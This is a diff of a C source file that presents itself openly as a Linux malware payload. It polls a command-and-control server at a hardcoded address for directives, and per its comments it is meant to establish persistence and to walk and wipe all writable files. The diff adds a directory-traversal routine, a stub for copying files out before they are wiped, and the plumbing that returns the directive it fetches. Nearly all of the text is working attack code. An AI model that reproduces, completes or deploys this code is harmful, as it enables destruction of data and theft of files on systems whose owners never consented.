@@ -1,42 +1,107 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <curl/curl.h>
+#include <string.h>
+#include <dirent.h>
+#include <sys/stat.h>
 
 /* Compilation: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast
  * sudo apt install libcurl4-openssl-dev
  * gcc main.c -o main -lcurl
  *
 */
+
+/* Supported Directives:
+ * - COPY
+*/
+
+/* Operating the C2:
+ * Leave the directive in "instruction.txt" and serve in at CADDRESS as shown below.
+ * 
+*/
+
 /* 
  * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
  * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
  * Functionality to copy files before wiping them will be a nice addition at some point in the future.
  * 
  * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
- * */
+*/
 
 // Prototypes:
 
 char * readFile(char * fileName);
-int takeControlInstruction(void); 
+char * takeControlInstruction(void); 
+void Copy(void);
+void copyContents(char * fileName);
 
 // Globals:
 
 char * CADDRESS = "http://192.168.0.200:5678/instruction.txt";
+char * BASEDIRECTORY = "/home/ezra/test";
 
 // Main function:
 
 int main(int argc, char * argv[]) {
 	
-	takeControlInstruction();
+	char * controllerDirective;
+	controllerDirective = takeControlInstruction();
+	printf("%s", controllerDirective);
+
+	Copy();
 
 	return 0;
 }
 
 // Function definitions:
 
-int takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
-	CURL *curl;
+void Copy() {
+	
+	char * current;
+
+	struct dirent * entry;
+	DIR * dir = opendir(BASEDIRECTORY);
+
+	if (dir == NULL) {
+		printf("Cannot open directory.");
+		return;
+	}
+
+	while ((entry = readdir(dir)) != NULL) {
+		char fullPath[1024];
+		snprintf(fullPath, sizeof(fullPath), "%s/%s", BASEDIRECTORY, entry->d_name);
+
+		struct stat path_stat;
+		stat(fullPath, &path_stat);
+
+		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
+			current = fullPath;
+			printf("File: %s\n", current);
+		}
+		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
+			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+				current = strcat(fullPath, "/");		
+				printf("Directory: %s\n ", current);
+			}
+			else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+				/*printf("EXCEPTION: %s\n", entry->d_name);*/
+				continue;
+			}
+		}
+	}
+
+	closedir(dir);
+
+}
+
+void copyContents(char * fileName) {
+	
+	
+
+}
+
+char * takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
+	CURL * curl;
 	CURLcode res;
 
 	freopen("tmp", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later
@@ -55,9 +120,9 @@ int takeControlInstruction(void) {			// Contact C2, place directive in file name
 	freopen("/dev/tty", "w", stdout);		// Cleaning up output redirection; This is Linux specific
 
 	char * instruction = readFile("tmp");
-	printf("%s", instruction);
-
-	return 0;
+	/*printf("%s", instruction);*/
+	
+	return instruction;
 }
 
 char * readFile(char * fileName) {
